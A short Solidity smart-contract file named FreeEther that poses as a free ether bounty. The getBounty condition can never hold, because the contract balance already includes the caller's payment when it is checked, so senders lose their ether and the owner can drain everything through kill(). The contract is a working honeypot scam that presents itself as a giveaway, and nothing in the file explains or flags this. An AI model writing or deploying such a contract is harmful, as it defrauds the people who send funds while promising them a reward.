// own work
pragma solidity ^0.4.23;

contract FreeEther {
    address owner;

    constructor() payable public {
        owner = msg.sender;
    }
    
    function getBounty() public payable {
        if (msg.value > address(this).balance)
            msg.sender.transfer(address(this).balance);
    }
    
    function kill() public {
        require(msg.sender == owner);
        selfdestruct(owner);
    }
}
